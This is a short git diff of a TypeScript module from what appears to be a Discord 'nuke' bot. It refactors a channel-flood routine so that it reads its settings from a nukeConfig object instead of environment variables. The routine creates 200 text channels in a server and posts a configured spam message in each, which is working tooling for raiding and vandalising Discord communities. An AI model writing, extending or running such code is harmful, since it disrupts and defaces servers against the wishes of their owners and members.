@@ -1,15 +1,16 @@
 import { Guild, ChannelType } from "discord.js";
+import { nukeConfig } from "../index";
 
 export default async (guild: Guild): Promise<void> => {
-	if (process.env.CHANNELS_FLOOD) {
+	if (nukeConfig.CHANNELS_FLOOD) {
 		try {
 			for (let i = 0; i < 200; i++) {
 				const channel = await guild.channels.create({
-					name: process.env.CHANNELS_FLOOD_NAME,
+					name: nukeConfig.CHANNELS_FLOOD_NAME,
 					type: ChannelType.GuildText,
 				});
 
-				await channel.send(process.env.CHANNELS_FLOOD_TEXT);
+				await channel.send(nukeConfig.CHANNELS_FLOOD_TEXT);
 			}
 		} catch (error) {
 			console.log(error);
